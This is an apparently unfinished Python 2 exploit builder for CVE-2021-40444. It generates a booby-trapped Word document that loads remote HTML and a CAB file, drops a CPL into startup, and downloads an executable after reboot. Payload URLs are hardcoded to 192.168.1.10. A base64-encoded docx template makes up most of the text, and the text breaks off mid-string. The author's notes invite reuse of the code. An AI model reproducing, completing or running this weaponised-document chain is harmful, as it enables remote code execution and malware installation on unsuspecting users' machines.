import zipfile,os,shutil,string,random

'''
NOTES:
Chain : docx -> html -> cab ---extract---> cpl(startup) -> reboot ---download---> exe (public)
I was either too occupied or lost interest in making this chain possible. Anyway it was free-time thing i was doing,
you can either reuse this code or just take some inspiration from the idea IDK. I have abandoned it already, 
Code is almost 2 years old. :)

TODO:
1; embed dll to cab file
2; replace default url string to exe in cab file
3; auto generate CAB file
4; test
'''


__ = r'''
CVE-2021-40444
'''

print __

try:
    os.mkdir("yoy")
except WindowsError as e:
    print "[!] Working Directory Already Exists."
    pass
exeurl = "http://192.168.1.10/something.exe"
html = "http://192.168.1.10/side.html"
caburl = "http://192.168.1.10/samzz.cab"
htmlname = "side.html"
cplname = "championship.cpl"

doc=r"""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